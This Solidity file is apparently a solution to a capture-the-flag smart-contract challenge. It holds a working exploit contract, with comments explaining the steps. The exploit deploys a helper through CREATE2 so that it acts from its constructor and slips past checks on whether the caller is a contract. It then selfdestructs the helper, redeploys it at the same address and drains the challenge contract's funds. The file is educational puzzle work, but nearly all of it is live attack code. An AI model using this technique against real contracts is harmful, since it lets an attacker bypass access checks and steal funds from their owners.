// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

import "@openzeppelin/contracts/utils/Create2.sol";
import "./Challenge2.sol";

// basic idea of challenge:
// need to steadily increment state until its the right number and then take all the funds
// the four functions switch between requiring the sender to be a contract and not
// the sender must also be the same address through the 4 function calls
// solution:
// create a contract (main) that creates a contract (helper)
// helper does first step in constructor (not a contract yet) then second step (called by main contract)
// main contract then destroys helper contract
// do the same step in finalize but calling 3rd and fourth step, 3rd while in constructor so not a contract
// and 4th once contract has been created. Make sure to have recieve to get the funds and also to change the
// output of sup based on the state of challenge2!
// fix

// main function deployed
contract ExploitMain {
    using Address for address;
    ExploitHelper public exploit;

    constructor(address _challenge) {
        _challenge; // not needed
        // create2 helper contract, call 2nd function
        bytes memory bytecode = type(ExploitHelper).creationCode;
        address addr = Create2.deploy(0, bytes32(0), bytecode);
        exploit = ExploitHelper(payable(addr));
        exploit.second();
        exploit.kill(); // destroy
    }

    function finalize() public {
        // create2 contract again, this time constructor calls 3rd funciton istead of 1st because of the state
        // of challenge2, same address because the contract is the same (no constructor inputs!)
        bytes memory bytecode = type(ExploitHelper).creationCode;
        address addr = Create2.deploy(0, bytes32(0), bytecode);
        exploit = ExploitHelper(payable(addr));
        // final call, make sure you have a fallback!
        exploit.fourth();
    }
}

contract ExploitHelper is ICalled {
    Challenge2 challenge =
        Challenge2(0x5e17b14ADd6c386305A32928F985b29bbA34Eff5);

    constructor() {
        // dont need inputs, read the chain!
        // changed the order so its confusing
        if (challenge.state() == Challenge2.State.THREE) {
            third();
        } else {
            first();
        }
    }

    function sup() public view override returns (uint256) {
        if (challenge.state() == Challenge2.State.TWO) {
            return 1337;
        } else {
            return 80085;
        }
    }

    function first() public {
        challenge.first();
    }

    function second() public {
        challenge.second();
    }

    function third() public {
        challenge.third();
    }

    function fourth() public {
        challenge.fourth();
    }

    function kill() public {
        selfdestruct(payable(0x1234567890123456789012345678901234567890));
    }

    receive() external payable {}
}